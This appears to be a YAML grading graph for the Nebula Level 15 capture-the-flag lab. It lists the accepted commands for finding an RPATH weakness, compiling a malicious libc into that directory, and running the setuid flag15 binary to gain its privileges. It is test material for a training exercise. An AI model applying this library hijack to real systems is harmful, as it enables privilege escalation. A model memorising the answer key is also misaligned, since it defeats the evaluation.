version: '0.5'
graph:
  type: reference
challenge:
  id: nebula_level15
  name: Nebula Level 15
  description: Abuse the RPATH search path to load a malicious libc and execute code as flag15.
attacker_context:
  user: level15
  access:
    method: ssh
    credentials:
      username: level15
      password: level15
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node2
irrelevant_commands:
- man
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- ls
- cd
- cat
- file
- strings
- ltrace
- strace
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: RPATH weakness identified
- id: node1
  type: state
  label: Malicious libc prepared
- id: node2
  type: state
  label: Execution as flag15 obtained
edges:
- id: edge0
  from: start
  to: node0
  action: discover_custom_library_search_path
  accepted_commands:
  - strace /home/flag15/flag15
  - readelf -d /home/flag15/flag15
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge1
  from: node0
  to: node1
  action: compile_malicious_libc_into_rpath_directory
  accepted_commands:
  - gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /tmp/libc.c
  - cc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /tmp/libc.c
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge2
  from: node1
  to: node2
  action: execute_flag15_with_malicious_library
  accepted_commands:
  - /home/flag15/flag15
  - /home/flag15/flag15 -p
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
